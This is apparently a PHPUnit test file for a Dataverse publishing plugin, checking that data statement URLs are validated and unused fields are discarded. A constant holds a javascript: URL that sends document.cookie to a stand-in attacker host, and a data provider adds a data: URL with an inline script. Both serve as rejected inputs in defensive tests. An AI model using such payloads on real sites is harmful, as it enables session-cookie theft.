<?php

import('lib.pkp.tests.DatabaseTestCase');
import('plugins.generic.dataverse.classes.dispatchers.DataStatementDispatcher');

class DataStatementValidationTest extends DatabaseTestCase
{
    private const REPOSITORY_URL = 'https://demo.dataverse.org/dataset.xhtml?persistentId=doi:10.5072/FK2/U6AEZM';
    private const SCRIPT_URL = "javascript:fetch('//attacker.invalid/'+document.cookie)";

    private $dispatcher;

    protected function getMockedRegistryKeys(): array
    {
        return ['hooks'];
    }

    protected function getAffectedTables(): array
    {
        return ['publications', 'publication_settings'];
    }

    protected function setUp(): void
    {
        parent::setUp();
        $this->dispatcher = (new ReflectionClass(DataStatementDispatcher::class))->newInstanceWithoutConstructor();
        HookRegistry::register('Schema::get::publication', [$this->dispatcher, 'addDataStatementToPublicationSchema']);
        Services::get('schema')->get(SCHEMA_PUBLICATION, true);
    }

    protected function tearDown(): void
    {
        parent::tearDown();
        Services::get('schema')->get(SCHEMA_PUBLICATION, true);
    }

    private function validate(string $action, array $props): array
    {
        $errors = [];
        $this->dispatcher->validateDataStatementProps('Publication::validate', [&$errors, $action, $props, ['en_US'], 'en_US']);

        return $errors;
    }

    private function insertPublicationAvailableInRepository(): int
    {
        $publicationDAO = DAORegistry::getDAO('PublicationDAO');
        $publication = $publicationDAO->newDataObject();
        $publication->setData('submissionId', rand());
        $publication->setData('dataStatementTypes', [DATA_STATEMENT_TYPE_REPO_AVAILABLE]);
        $publication->setData('dataStatementUrls', [self::REPOSITORY_URL]);

        return $publicationDAO->insertObject($publication);
    }

    public function urlsRejectedByTheApi(): array
    {
        return [
            'javascript scheme' => [self::SCRIPT_URL],
            'data scheme' => ['data:text/html,<script>alert(1)</script>'],
            'not a URL' => ['not a url'],
        ];
    }

    /**
     * @dataProvider urlsRejectedByTheApi
     */
    public function testRepositoryUrlsMustBeUrlsWhenTheTypeIsSent(string $url): void
    {
        $errors = $this->validate(VALIDATE_ACTION_EDIT, [
            'dataStatementTypes' => [DATA_STATEMENT_TYPE_REPO_AVAILABLE],
            'dataStatementUrls' => [self::REPOSITORY_URL, $url],
        ]);

        $this->assertSame(
            [__('plugins.generic.dataverse.dataStatement.repoAvailable.urls.urlFormat')],
            $errors['dataStatementUrls'] ?? null
        );
    }

    public function testRepositoryUrlsAreCheckedAgainstTheSavedTypeWhenOnlyUrlsAreSent(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();

        $errors = $this->validate(VALIDATE_ACTION_EDIT, [
            'id' => $publicationId,
            'dataStatementUrls' => [self::SCRIPT_URL],
        ]);

        $this->assertArrayHasKey('dataStatementUrls', $errors);
    }

    public function testValidRepositoryUrlsAreAccepted(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();

        $errors = $this->validate(VALIDATE_ACTION_EDIT, [
            'id' => $publicationId,
            'dataStatementUrls' => [self::REPOSITORY_URL, 'https://example.com/data'],
        ]);

        $this->assertSame([], $errors);
    }

    public function testRepositoryTypeStillRequiresUrls(): void
    {
        $errors = $this->validate(VALIDATE_ACTION_EDIT, [
            'dataStatementTypes' => [DATA_STATEMENT_TYPE_REPO_AVAILABLE],
            'dataStatementUrls' => [],
        ]);

        $this->assertSame(
            [__('plugins.generic.dataverse.dataStatement.repoAvailable.urls.required')],
            $errors['dataStatementUrls'] ?? null
        );
    }

    private function editPublication(int $publicationId, array $params): Publication
    {
        $publicationDAO = DAORegistry::getDAO('PublicationDAO');
        $publication = $publicationDAO->getById($publicationId);
        $newPublication = $publicationDAO->newDataObject();
        $newPublication->_data = array_merge($publication->_data, $params);

        $this->dispatcher->clearUnusedDataStatementFields('Publication::edit', [&$newPublication, $publication, $params, null]);
        $publicationDAO->updateObject($newPublication);

        return $publicationDAO->getById($publicationId);
    }

    public function testUrlsAreDiscardedWhenTheTypeIsNotAvailableInRepository(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();

        $publication = $this->editPublication($publicationId, [
            'dataStatementTypes' => [DATA_STATEMENT_TYPE_IN_MANUSCRIPT],
            'dataStatementUrls' => [self::SCRIPT_URL],
        ]);

        $this->assertSame([DATA_STATEMENT_TYPE_IN_MANUSCRIPT], $publication->getData('dataStatementTypes'));
        $this->assertNull($publication->getData('dataStatementUrls'));
    }

    public function testUrlsSentAloneAreDiscardedWhenTheSavedTypeIsNotAvailableInRepository(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();
        $this->editPublication($publicationId, ['dataStatementTypes' => [DATA_STATEMENT_TYPE_ON_DEMAND]]);

        $publication = $this->editPublication($publicationId, ['dataStatementUrls' => [self::SCRIPT_URL]]);

        $this->assertNull($publication->getData('dataStatementUrls'));
    }

    public function testReasonIsDiscardedWhenTheTypeIsNotPubliclyUnavailable(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();

        $publication = $this->editPublication($publicationId, [
            'dataStatementReason' => ['en_US' => 'Sensitive data'],
        ]);

        $this->assertNull($publication->getData('dataStatementReason'));
        $this->assertSame([self::REPOSITORY_URL], $publication->getData('dataStatementUrls'));
    }

    public function testUrlsAndReasonAreKeptForTheirTypes(): void
    {
        $publicationId = $this->insertPublicationAvailableInRepository();

        $publication = $this->editPublication($publicationId, [
            'dataStatementTypes' => [DATA_STATEMENT_TYPE_REPO_AVAILABLE, DATA_STATEMENT_TYPE_PUBLICLY_UNAVAILABLE],
            'dataStatementReason' => ['en_US' => 'Sensitive data'],
        ]);

        $this->assertSame([self::REPOSITORY_URL], $publication->getData('dataStatementUrls'));
        $this->assertSame('Sensitive data', $publication->getData('dataStatementReason', 'en_US'));
    }
}
